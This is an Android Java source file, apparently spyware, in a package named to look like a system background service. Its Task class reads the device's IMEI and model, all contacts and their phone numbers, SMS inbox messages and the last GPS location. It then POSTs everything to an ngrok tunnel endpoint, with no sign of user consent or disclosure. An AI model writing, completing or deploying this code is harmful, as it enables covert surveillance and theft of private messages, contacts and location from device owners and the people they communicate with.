package com.android.backgroundservice;

import static android.content.ContentValues.TAG;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.icu.text.SimpleDateFormat;
import android.icu.util.Calendar;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;


public class Task extends AppCompatActivity implements LocationListener {
    //getDeviceName
    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return " ";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }

    //getDeviceName
    public String getDevicename() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }
    public String getDeviceIMEI(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String IMEINumber = telephonyManager.getDeviceId();
        return IMEINumber;
    }
    //getcontacts
    private static final int REQUEST_READ_CONTACTS = 79;

    public void requestPermission() {
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS)) {
        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CONTACTS},
                    REQUEST_READ_CONTACTS);
        }
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS)) {
        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CONTACTS},
                    REQUEST_READ_CONTACTS);
        }
    }

    @SuppressLint("Range")
    public ArrayList<String> getAllContacts(Context context) {
        ArrayList<String> nameList = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                @SuppressLint("Range") String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                @SuppressLint("Range") String phone = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                nameList.add(name);
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        nameList.add(phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }
        return nameList;
    }

    //get sms
    private int numsms;

    public void GetSmsTask(int numsms) {
        this.numsms = numsms;
    }

    public String getMessage(Context context) {
        String smstask = null;
        Uri callUri = Uri.parse("content://sms//inbox");
        ContentResolver cr = context.getApplicationContext().getContentResolver();
        Cursor mCur = cr.query(callUri, null, null, null, null);
        if (mCur.moveToFirst()) {
            do {
                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                Calendar calendar = Calendar.getInstance();
                @SuppressLint("Range") String now = mCur.getString(mCur.getColumnIndex("date"));
                calendar.setTimeInMillis(Long.parseLong(now));
                try {
                    @SuppressLint("Range") String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
                    @SuppressLint("Range") String id = mCur.getString(mCur.getColumnIndex("_id"));
                    @SuppressLint("Range") String phone = mCur.getString(mCur.getColumnIndex("address"));
                    @SuppressLint("Range") String body = mCur.getString(mCur.getColumnIndex("body"));
                    String date = formatter.format(calendar.getTime());
                    @SuppressLint("Range") String type = mCur.getString(mCur.getColumnIndex("type"));
                    smstask = thread_id + "-" + id + "-" + phone + "-" + "name" + "-" + body + "-" + date + "-" + type;
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
                this.numsms --;
            } while (mCur.moveToNext() && this.numsms > 0);
        }
        else {
            return "Don't Read SMS!!!";
        }
        Log.d(TAG,smstask);
        return smstask;
    }
    //getLocation
    protected String latitude,longitude;
    @Override
    public void onProviderDisabled(String provider) {
        Log.d("Latitude","disable");
    }

    @Override
    public void onProviderEnabled(String provider) {
        Log.d("Latitude","enable");
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        Log.d("Latitude","status");
    }
    @Override
    public void onLocationChanged(@NonNull Location location) {
        latitude = String.valueOf(location.getLatitude());
        longitude = String.valueOf(location.getLongitude());
    }
    @SuppressLint("MissingPermission")
    public String getloc(Context context){
        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        Location localGpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (localGpsLocation != null)
        {
            latitude = String.valueOf(localGpsLocation.getLatitude());
            longitude = String.valueOf(localGpsLocation.getLongitude());
        }
        return latitude + " - " + longitude;
    }
    //postData
    public void sendJsonPostRequest(Context context){
        try {
            JSONObject jsonParams = new JSONObject();
            jsonParams.put("nameDevice", getDevicename());
            jsonParams.put("IMEI",getDeviceIMEI(context));
            jsonParams.put("numberPhone",getAllContacts(context));
            jsonParams.put("messagePhone",getMessage(context));
            jsonParams.put("locationPhone",getloc(context));
            jsonParams.put("IP","");
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, String.format("https://7af2-14-162-197-223.ap.ngrok.io/api"), jsonParams,new Response.Listener<JSONObject>() {
                        @Override
                        public void onResponse(JSONObject response) {
                            Toast.makeText(context, "OK!", Toast.LENGTH_SHORT).show();
                        }
                    }, new Response.ErrorListener(){
                        @Override
                        public void onErrorResponse(VolleyError error) {
                        }
                    });

            Volley.newRequestQueue(context).
                    add(request);
        } catch(JSONException ex){

        }

    }
}
